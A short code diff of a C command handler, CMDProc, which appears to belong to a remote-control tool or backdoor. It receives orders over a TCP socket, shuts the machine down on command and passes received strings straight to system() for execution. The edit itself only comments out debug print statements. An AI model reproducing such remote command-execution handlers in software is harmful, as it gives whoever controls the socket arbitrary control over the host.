@@ -28,7 +28,7 @@ void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
                     system("shutdown -h");
                     break;
                 case 0x06://执行cmd无返回值
-                    //printf("revData:%s\n",revData+2);
+                    //printf("Order.0x06:%s\n",Order+2);
                     system(Order+2);
                     break;
                 case 0x07://执行cmd有返回值
@@ -143,7 +143,7 @@ void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
             break;
     }
 
-    printf("free\n");
+    //printf("free\n");
     free(Order-8);
-    printf("freeOK\n");
+    //printf("freeOK\n");
 }
